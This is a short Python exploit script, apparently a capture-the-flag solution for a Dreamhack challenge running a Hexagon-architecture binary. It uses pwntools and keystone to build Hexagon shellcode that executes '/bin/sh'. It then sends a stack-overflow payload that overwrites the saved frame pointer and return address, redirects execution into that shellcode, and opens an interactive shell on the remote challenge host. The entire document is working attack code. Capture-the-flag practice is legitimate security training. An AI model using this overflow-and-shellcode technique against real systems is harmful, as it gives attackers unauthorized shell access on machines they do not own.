from pwn import *
import time

from keystone import *

ks = Ks(KS_ARCH_HEXAGON, KS_MODE_LITTLE_ENDIAN)
addr = 0x40600000 # rw? rwx?

code = f"""
R6 = ##0xDD
R0 = ##{hex(addr + 0x38)}
R1 = ##{hex(addr + 0x40)}
R2 = ##{hex(addr + 0x50)}
"""
encoding, count = ks.asm(code)
asmcode = bytearray(encoding)
asmcode += bytes.fromhex("04C00054") # trap0(#0x1)

code = f"""
R6 = ##0x5D
R0 = ##0x0
"""
encoding, count = ks.asm(code)
asmcode += bytearray(encoding)
asmcode += bytes.fromhex("04C00054")

#p = process(["qemu-hexagon-static", "-strace", "./vuln"])
p = remote("host3.dreamhack.games", 12649)

payload = b""
payload = payload.ljust(0x100, b"A")
payload += p32(addr + 0x100) # FP
payload += p32(0x202bc) # PC

p.send(payload)
time.sleep(1)

payload = b""
payload += asmcode
payload += b"/bin/sh\x00" 
payload += p32(addr+0x38)
payload = payload.ljust(0x100, b"\x00")
payload += p32(addr) # FP
payload += p32(addr) # PC

p.send(payload)

p.interactive()
